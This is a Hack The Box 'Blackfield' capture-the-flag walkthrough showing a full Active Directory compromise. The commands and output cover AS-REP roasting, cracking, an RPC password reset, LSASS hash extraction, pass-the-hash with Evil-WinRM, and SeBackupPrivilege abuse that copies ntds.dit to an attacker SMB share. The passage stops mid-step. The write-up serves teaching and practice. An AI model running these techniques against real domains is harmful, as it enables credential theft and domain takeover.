---
icon: link
---

# HTB-BLACKFIELD

<figure><img src="../../../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>

### Attack Flow Explaination

```
Port Scan → Anonymous SMB → AS-REP Roasting → BloodHound → Password Reset → 
Forensic Share → Memory Dump → Pass-the-Hash → SeBackupPrivilege → Domain Admin
```

***

#### 1. Initial Access

* **SMB Enumeration**: Found \`profiles share with 300+ usernames
* **AS-REP Roasting**: Cracked `support` user password: `#00^BlackKnight`

#### 2. Privilege Escalation Path 1

* **BloodHound**: Discovered `support` can reset `audit2020` password
* **RPC Password Reset**: Changed `audit2020` password to `P@$w0rd12345`
* **Forensic Share**: Gained access to memory dumps and system files

#### 3. Memory Analysis

* **LSASS Dump**: Extracted from forensic share
* **Hash Extraction**: Found `svc_backup` NTLM hash: `9658d1d1dcd9250115e2205d9f48400d`

#### 4. Initial Shell Access

* **Pass-the-Hash**: Used `svc_backup` hash for Evil-WinRM access
* **User Flag**: Retrieved from `svc_backup` desktop

#### 5. Privilege Escalation Path 2 (SeBackupPrivilege)

* **Privilege Check**: `svc_backup` has `SeBackupPrivilege` + `SeRestorePrivilege`
* **Group Membership**: Member of `Backup Operators` group
* **Volume Shadow Copy**: Used `diskshadow` to create VSS snapshot
* **NTDS.dit Extraction**: Copied domain database from shadow copy
* **Hash Dumping**: Extracted all domain hashes including Administrator

#### 6. Full Domain Compromise

* **Administrator Hash**: `184fb5e5178480be64824d4cd53b99ee`
* **Pass-the-Hash**: Gained Administrator shell via Evil-WinRM
* **Root Flag**: Complete domain takeover achieved

### Reconnaissance

#### Port Scanning with Rustscan + Nmap

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ rustscan -a 10.10.10.192 \\ BLAH BLAH BLAH

```

**Output:**

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <https://discord.gg/GFrQsGy>           :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.10.192:53
Open 10.10.10.192:88
Open 10.10.10.192:135
Open 10.10.10.192:389
Open 10.10.10.192:445
Open 10.10.10.192:593
Open 10.10.10.192:5985
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Discovered open port 53/tcp on 10.10.10.192
Discovered open port 389/tcp on 10.10.10.192
Discovered open port 445/tcp on 10.10.10.192
Discovered open port 135/tcp on 10.10.10.192
Discovered open port 88/tcp on 10.10.10.192
Discovered open port 5985/tcp on 10.10.10.192
Discovered open port 593/tcp on 10.10.10.192

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-05 19:40:24Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

```

#### Analysis of Open Ports:

* **53/tcp (DNS)**: Simple DNS Plus
* **88/tcp (Kerberos)**: Microsoft Windows Kerberos
* **135/tcp (RPC)**: Microsoft Windows RPC
* **389/tcp (LDAP)**: Microsoft Windows Active Directory LDAP
* **445/tcp (SMB)**: Microsoft Directory Services
* **593/tcp (RPC over HTTP)**: Microsoft Windows RPC over HTTP 1.0
* **5985/tcp (WinRM)**: Microsoft HTTPAPI httpd 2.0

This confirms we're dealing with a Windows Domain Controller running AD services.

***

### SMB Enumeration (TCP 445)

#### Listing SMB Shares

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ smbclient -N -L //10.10.10.192/

```

**Output:**

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available

```

#### Accessing profiles$ Share

The `profiles$` share is accessible without authentication:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ smbclient -N //10.10.10.192/profiles$
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Wed Jun  3 16:47:12 2020
  ..                                  D        0  Wed Jun  3 16:47:12 2020
  AAlleni                             D        0  Wed Jun  3 16:47:11 2020
  ABarteski                           D        0  Wed Jun  3 16:47:11 2020
  ABekesz                             D        0  Wed Jun  3 16:47:11 2020
  ABenzies                            D        0  Wed Jun  3 16:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 16:47:11 2020
  AChampken                           D        0  Wed Jun  3 16:47:11 2020
  ACheretei                           D        0  Wed Jun  3 16:47:11 2020
  <SNIP>
  ZScozzari                           D        0  Wed Jun  3 16:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 16:47:12 2020
  ZWausik                             D        0  Wed Jun  3 16:47:12 2020

                5102079 blocks of size 4096. 1691946 blocks available

```

#### Downloading User Profile Data

```bash
smb: \\> recurse on
smb: \\> prompt off
smb: \\> mget *

```

**Key Finding**: I discovered a large number of user profile directories. All directories were empty, but the directory names represent potential domain usernames.

#### Creating User List

I extracted all the usernames from the profile directories to create a user list for further attacks:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ ls profiles/ > users.txt

```

***

### AS-REP Roasting Attack

With a potential user list, I can test for accounts that have Kerberos pre-authentication disabled (UF\_DONT\_REQUIRE\_PREAUTH flag).

#### Testing Users for AS-REP Roasting

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done

```

**Output:**

```
/home/sn0x/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
<SNIP>
$krb5asrep$23$support@BLACKFIELD.LOCAL:4eb84760a0b35736bd6e93b4a9d03194$a22a8629e28f333ec19c8d9610d4046f046f4e6baf1b977fc5bc0d8b692b4b469fd5742c2a6a1a623c6a526ca45b5baffa63d5e360a6ede6a7de52b1dd97b76863a9cbf7b14ddd07ddee5375ffe32f222ef5cf6d9be7b04bf6439b450c080a81d43ad7237a1ffa52cf6937a881128003f4d2b9f06316150bb6427b2d39ed6294ae3b597c28beb4af279015ed6388622b0b9f6d4d0326d767f2c6c0adc07551c3380b28f23efb26d14c1f6f78a43fea3dd527c6dc12b9fd1fda9278a52cc700c5d56f41ff46e72f31ad89dbb533e415aa46b1b9cd80c97d36df083e75cb52f3c5a0bf4cb3f2c8aac283e12d9681d494e0f5683508

```

**Success!** The `support` user has AS-REP roasting enabled and I successfully captured the hash.

#### Cracking the AS-REP Hash

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ echo '$krb5asrep$23$support@BLACKFIELD.LOCAL:4eb84760a0b35736bd6e93b4a9d03194$a22a8629e28f333ec19c8d9610d4046f046f4e6baf1b977fc5bc0d8b692b4b469fd5742c2a6a1a623c6a526ca45b5baffa63d5e360a6ede6a7de52b1dd97b76863a9cbf7b14ddd07ddee5375ffe32f222ef5cf6d9be7b04bf6439b450c080a81d43ad7237a1ffa52cf6937a881128003f4d2b9f06316150bb6427b2d39ed6294ae3b597c28beb4af279015ed6388622b0b9f6d4d0326d767f2c6c0adc07551c3380b28f23efb26d14c1f6f78a43fea3dd527c6dc12b9fd1fda9278a52cc700c5d56f41ff46e72f31ad89dbb533e415aa46b1b9cd80c97d36df083e75cb52f3c5a0bf4cb3f2c8aac283e12d9681d494e0f5683508' > hash3.txt

┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ john hash3.txt --wordlist=/usr/share/wordlists/rockyou.txt

```

**Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:06 DONE (2025-09-05 14:10) 0.1468g/s 2104Kp/s 2104Kc/s 2104KC/s #1WIF3Y..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

**Credentials Found**: `support:#00^BlackKnight`

***

### Credential Validation

#### Testing SMB Access

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight'

```

**Output:**

```
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\\support:#00^BlackKnight

```

**Success!** The credentials are valid and provide SMB access.

#### LDAP Enumeration with Valid Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ ldapsearch -H ldap://10.10.10.192 -x -D "support@blackfield.local" -w '#00^BlackKnight' -b "DC=BLACKFIELD,DC=local" > support_ldap_dump

```

The LDAP enumeration provided basic domain information but nothing immediately exploitable.

#### Testing Kerberoasting

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ GetUserSPNs.py -request -dc-ip 10.10.10.192 'blackfield.local/support:#00^BlackKnight'

```

**Output:**

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

No entries found!

```

No Kerberoastable accounts found.

***

### BloodHound Enumeration

#### Running BloodHound Python Collector

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ bloodhound-python -c all -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192

```

#### Key BloodHound Finding

After importing the data into BloodHound, I discovered that the `support` user has **ForceChangePassword** privilege on the `AUDIT2020` user account.

This means I can reset the password for the `AUDIT2020` account using RPC.

***

### Password Reset Attack via RPC

#### Connecting to RPC

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192

```

#### Enumerating Groups and Users

```bash
rpcclient $> enumalsgroups builtin
group:[Server Operators] rid:[0x225]
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

```

#### Discovering Remote Management Users

```bash
rpcclient $> queryaliasmem builtin 0x244
        sid:[S-1-5-21-4194615774-2175524697-3563712290-1413]

rpcclient $> lookupsids S-1-5-21-4194615774-2175524697-3563712290-1413
S-1-5-21-4194615774-2175524697-3563712290-1413 BLACKFIELD\\svc_backup (1)

```

**Key Finding**: The `svc_backup` user is part of the Remote Management Users group, which means if we can get their credentials, we can access the domain controller via WinRM.

#### Resetting AUDIT2020 Password

```bash
rpcclient $> setuserinfo2 audit2020 23 'P@$$w0rd12345'

```

**Success!** The password reset was successful.

***

### Accessing Forensic Share

#### Testing New Credentials

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ smbmap -u 'audit2020' -d 'blackfield.local' -p 'P@$$w0rd12345' -H 10.10.10.192

```

**Output:**

```
[+] IP: 10.10.10.192:445        Name: DC01.BLACKFIELD.local     Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share

```

**Success!** The `audit2020` account now has access to the `forensic` share.

#### Exploring the Forensic Share

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ smbclient -U 'Blackfield.local/audit2020%P@$$w0rd12345' \\\\\\\\10.10.10.192\\\\forensic
Try "help" to get a list of possible commands.
smb: \\> ls
  .                                   D        0  Sun Feb 23 13:03:16 2020
  ..                                  D        0  Sun Feb 23 13:03:16 2020
  commands_output                     D        0  Sun Feb 23 18:14:37 2020
  memory_analysis                     D        0  Thu May 28 20:28:33 2020
  tools                               D        0  Sun Feb 23 13:39:08 2020

                5102079 blocks of size 4096. 1692299 blocks available

```

#### Downloading Forensic Data

```bash
smb: \\> prompt OFF
smb: \\> recurse
smb: \\> mget *
getting file \\commands_output\\domain_admins.txt of size 528 as commands_output/domain_admins.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \\commands_output\\domain_groups.txt of size 962 as commands_output/domain_groups.txt (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec)
getting file \\commands_output\\domain_users.txt of size 16454 as commands_output/domain_users.txt (12.8 KiloBytes/sec) (average 4.7 KiloBytes/sec)
getting file \\commands_output\\firewall_rules.txt of size 518202 as commands_output/firewall_rules.txt (206.3 KiloBytes/sec) (average 84.6 KiloBytes/sec)
getting file \\commands_output\\ipconfig.txt of size 1782 as commands_output/ipconfig.txt (1.4 KiloBytes/sec) (average 70.4 KiloBytes/sec)
getting file \\commands_output\\netstat.txt of size 3842 as commands_output/netstat.txt (2.9 KiloBytes/sec) (average 60.4 KiloBytes/sec)
getting file \\commands_output\\route.txt of size 3976 as commands_output/route.txt (2.9 KiloBytes/sec) (average 52.7 KiloBytes/sec)
getting file \\commands_output\\systeminfo.txt of size 4550 as commands_output/systeminfo.txt (3.5 KiloBytes/sec) (average 47.3 KiloBytes/sec)
getting file \\commands_output\\tasklist.txt of size 9990 as commands_output/tasklist.txt (7.8 KiloBytes/sec) (average 43.4 KiloBytes/sec)
parallel_read returned NT_STATUS_IO_TIMEOUT
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\ctfmon.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\dfsrs.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\dllhost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\ismserv.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\lsass.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\mmc.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\RuntimeBroker.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\ServerManager.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\sihost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\smartscreen.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\svchost.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\taskhostw.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\winlogon.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\wlms.zip
NT_STATUS_CONNECTION_DISCONNECTED opening remote file \\memory_analysis\\WmiPrvSE.zip

```

**Key Finding**: The `memory_analysis` folder contains multiple process memory dumps, including `lsass.zip` which is critical for extracting password hashes.

#### Downloading LSASS Memory Dump

Due to connection timeouts, I needed to download the LSASS dump separately:

```bash
smb: \\> cd memory_analysis
smb: \\memory_analysis\\> get lsass.zip
getting file \\memory_analysis\\lsass.zip of size 18366390 as lsass.zip (7314.9 KiloBytes/sec) (average 7314.9 KiloBytes/sec)

```

***

### Memory Dump Analysis

#### Extracting LSASS Dump

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield/memory_analysis]
└─$ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP

```

#### Using pypykatz to Extract Hashes

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield/memory_analysis]
└─$ pypykatz lsa minidump lsass.DMP >> lsass-dump.txt

```

**Key Hashes Found:**

```
[msv] BLACKFIELD\\administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62:7f1e4ff8c6a8e6b6fcae2d9c0572cd62
[msv] BLACKFIELD\\svc_backup 9658d1d1dcd9250115e2205d9f48400d:9658d1d1dcd9250115e2205d9f48400d

```

**Critical Discovery**: I now have NTLM hashes for:

* `administrator`: `7f1e4ff8c6a8e6b6fcae2d9c0572cd62`
* `svc_backup`: `9658d1d1dcd9250115e2205d9f48400d`

***

### Initial Access via Pass-the-Hash

#### Testing Administrator Hash

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ evil-winrm -i 10.10.10.192 -u 'blackfield.local\\administrator' -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62

```

**Output:**

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

```

The administrator hash doesn't work, likely because the password has been changed since the memory dump.

#### Testing svc\_backup Hash

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ evil-winrm -i 10.10.10.192 -u 'blackfield.local\\svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d

```

**Output:**

```
Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents>

```

**Success!** I now have shell access as `svc_backup`.

#### Getting User Flag

```bash
*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> cat "C:\\Users\\svc_backup\\Desktop\\user.txt"
3920bb317a0bef51027e2852be64b543

```

***

## Privilege Escalation via SeBackupPrivilege

### Initial Access: svc\_backup User

Starting with shell access as the `svc_backup` user through Evil-WinRM.

### Privilege Enumeration

#### Checking User Privileges

First, let's examine what privileges our current user has:

```powershell
*Evil-WinRM* PS C:\\Users\\svc_backup\\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

**Key Finding**: The `SeBackupPrivilege` is enabled, which essentially allows full system read access.

#### User Group Membership

Let's check what groups our user belongs to:

```powershell
*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> net user svc_backup
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/9/2020 5:27:18 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

**Key Finding**: The user is a member of the `Backup Operators` group, which is designed to backup and restore files using special methods to read and write most files on the system.

### Exploiting SeBackupPrivilege

#### Setting Up PowerShell Tools

To abuse the `SeBackupPrivilege`, we'll use specialized PowerShell cmdlets. First, upload the necessary DLL files:

```powershell
*Evil-WinRM* PS C:\\programdata> upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
Info: Uploading /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll to C:\\programdata\\SeBackupPrivilegeCmdLets.dll

Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\\programdata> upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
Info: Uploading /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll to C:\\programdata\\SeBackupPrivilegeUtils.dll

Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

```

#### Importing PowerShell Modules

Import the uploaded modules into our current session:

```powershell
*Evil-WinRM* PS C:\\programdata> import-module .\\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\\programdata> import-module .\\SeBackupPrivilegeUtils.dll

```

#### Testing File Access

Let's test our enhanced file access capabilities. First, try reading a protected file normally:

```powershell
*Evil-WinRM* PS C:\\windows\\system32\\config> type netlogon.dns
Access to the path 'C:\\windows\\system32\\config\\netlogon.dns' is denied.
At line:1 char:1
+ type netlogon.dns
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\\windows\\system32\\config\\netlogon.dns:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

```

Now use our backup privilege to copy and read it:

```powershell
*Evil-WinRM* PS C:\\windows\\system32\\config> Copy-FileSeBackupPrivilege netlogon.dns \\programdata\\netlogon.dns
*Evil-WinRM* PS C:\\windows\\system32\\config> type \\programdata\\netlogon.dns
2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local. 600 IN CNAME DC01.BLACKFIELD.local.
_ldap._tcp.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.pdc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 389 dc01.blackfield.local.
_ldap._tcp.gc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
_ldap._tcp.Default-First-Site-Name._sites.gc._msdcs.BLACKFIELD.local. 600 IN SRV 0 100 3268 dc01.blackfield.local.
...[snip]...

```

**Success!** Our backup privilege allows us to read protected files.

#### Attempting Direct NTDS.dit Access

Let's try to directly access the NTDS.dit file (which contains password hashes):

```powershell
*Evil-WinRM* PS C:\\programdata> Copy-FileSeBackupPrivilege C:\\Windows\\ntds\\ntds.dit .
Opening input file. - The process cannot access the file because it is being used by another process. (Exception from HRESULT: 0x80070020)
At line:1 char:1
+ Copy-FileSeBackupPrivilege C:\\Windows\\ntds\\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege

```

**Problem**: The file is locked because it's currently in use by the domain controller services.

#### Attempting Root Flag Access

Let's also check if we can read the root flag directly:

```powershell
*Evil-WinRM* PS C:\\programdata> Copy-FileSeBackupPrivilege \\users\\administrator\\desktop\\root.txt sn0x.txt
Opening input file. - Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))
At line:1 char:1
+ Copy-FileSeBackupPrivilege \\users\\administrator\\desktop\\root.txt sn0x ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception
    + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege

```

**Problem**: Access denied (this is due to EFS encryption, as we'll discover later).

### Using DiskShadow for Volume Shadow Copy

#### Strategy

Since NTDS.dit is locked, we'll use Microsoft's `diskshadow` utility to create a Volume Shadow Copy (VSS) of the C: drive. This will allow us to access a snapshot of the filesystem where files aren't locked.

#### Creating the DiskShadow Script

Create a script file for diskshadow. **Important**: The script must use Windows line endings (CRLF).

```bash
# On Kali, create the script:

┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ cat > vss.dsh << EOF
set context persistent nowriters
set metadata c:\\programdata\\sn0x.cab
set verbose on
add volume c: alias sn0x
create
expose %sn0x% z:
EOF

# Convert to Windows line endings:
unix2dos vss.dsh

```

#### Troubleshooting DiskShadow

Upload and run the script:

```powershell
*Evil-WinRM* PS C:\\windows\\system32> upload vss.dsh c:\\programdata\\vss.dsh
Info: Uploading vss.dsh to c:\\programdata\\vss.dsh

Data: 108 bytes of 108 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\\windows\\system32> diskshadow /s c:\\programdata\\vss.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/9/2020 9:15:49 PM

-> set context persistent nowriters
-> set metadata c:\\programdata\\sn0x.cab
-> set verbose on
-> add volume c: alias sn0x
-> create

Alias sn0x for shadow ID {fe96248c-9468-4892-befc-a9ac2dda6a8e} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {e5573ff3-af32-4b6e-961a-8db9a3e76625} set as environment variable.
Inserted file Manifest.xml into .cab file sn0x.cab
Inserted file Dis6354.tmp into .cab file sn0x.cab

Querying all shadow copies with the shadow copy set ID {e5573ff3-af32-4b6e-961a-8db9a3e76625}

        * Shadow copy ID = {fe96248c-9468-4892-befc-a9ac2dda6a8e}               %sn0x%
                - Shadow copy set: {e5573ff3-af32-4b6e-961a-8db9a3e76625}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\]
                - Creation time: 6/9/2020 9:15:50 PM
                - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %sn0x% z:
-> %sn0x% = {fe96248c-9468-4892-befc-a9ac2dda6a8e}
The shadow copy was successfully exposed as z:\\.
->

```

**Success!** The shadow copy is now mounted as the Z: drive.

#### Final Working Script

The working diskshadow script:

```
set context persistent nowriters
set metadata c:\\programdata\\sn0x.cab
set verbose on
add volume c: alias sn0x
create
expose %sn0x% z:

```

#### Cleanup Script

Also create a cleanup script for later:

```
set context persistent nowriters
set metadata c:\\programdata\\sn0x.cab
set verbose on
delete shadows volume sn0x
reset

```

### Extracting NTDS.dit and SYSTEM Hive

#### Setting Up SMB Server

Start an SMB server on your attacking machine to receive the files:

```bash
# On Kali:
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ smbserver.py s . -smb2support -username sn0x -password sn0x

```

#### Connecting to SMB Share

From the target machine, connect to our SMB share:

```powershell
*Evil-WinRM* PS C:\\programdata> net use \\\\10.10.17.5\\s /u:sn0x sn0x
The command completed successfully.

```

#### Copying NTDS.dit

Now we can copy the NTDS.dit file from the shadow copy:

```powershell
*Evil-WinRM* PS C:\\programdata> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit \\\\10.10.17.5\\s\\ntds.dit

```

This takes a minute but succeeds without errors.

#### Extracting SYSTEM Registry Hive

We also need the SYSTEM registry hive to decrypt the password hashes:

